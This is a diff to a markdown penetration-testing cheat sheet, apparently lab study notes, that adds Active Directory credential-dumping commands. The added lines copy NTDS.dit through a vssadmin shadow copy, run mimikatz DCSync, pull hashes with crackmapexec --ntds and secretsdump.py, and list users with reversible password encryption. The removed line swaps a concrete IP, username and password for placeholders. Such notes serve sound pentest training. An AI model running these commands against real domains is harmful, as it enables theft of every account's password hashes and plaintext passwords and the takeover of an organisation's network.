@@ -20,7 +20,7 @@ $!	    Add the exclamation character at the end.
 hashcat --force password.list -r rule --stdout | sort -u > mut_password.list
 ```
 
-## Cracking Protected Archives
+### Cracking Protected Archives
 
 ```shell
 # Use John to crack protected files
@@ -97,13 +97,29 @@ sekurlsa::logonpasswords
 # Creating copy of ntds.dit using vssadmin
 vssadmin CREATE SHADOW /For=C:
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+# Using mimikatz
+lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\$USER
 ```
 
 - From linux host:
 
 ```shell
-crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+crackmapexec smb $TARGET_IP  -u $USER -p $PASSWORD --ntds
+secretsdump.py -outputfile hashes -just-dc $DOMAIN/$USER@$TARGET_IP 
 ```
+
+- Enumerating users with reversible encryption enabled:
+
+```shell
+# Get list of users
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+# Verify if reversible encryption is enabled
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+
+> Secretsdump.py will save reversible passwords in plain text.
 
 ### Credential Hunting
 
